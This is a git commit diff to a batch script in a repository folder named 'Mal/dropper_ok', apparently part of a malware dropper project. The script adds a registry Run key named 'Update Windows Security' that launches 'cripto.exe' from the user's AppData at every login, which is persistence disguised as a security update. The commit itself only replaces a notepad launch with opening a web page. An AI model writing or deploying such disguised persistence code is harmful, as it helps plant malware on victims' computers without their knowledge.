aee4a32af2b830dd571dc60d2d29cb4ae781d8d3
El Capitán <heneverloses@gmail.com>
2020-11-27 14:12:28 -0600

    estatus

--- Mal/dropper_ok/2_update_security.bat
+++ Mal/dropper_ok/2_update_security.bat
@@ -1,4 +1,4 @@
 @echo off
 mkdir testtest
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update Windows Security" /t REG_SZ /d "%appdata%\windowsSecurity\cripto.exe" /f
-notepad.exe
+start www.google.com
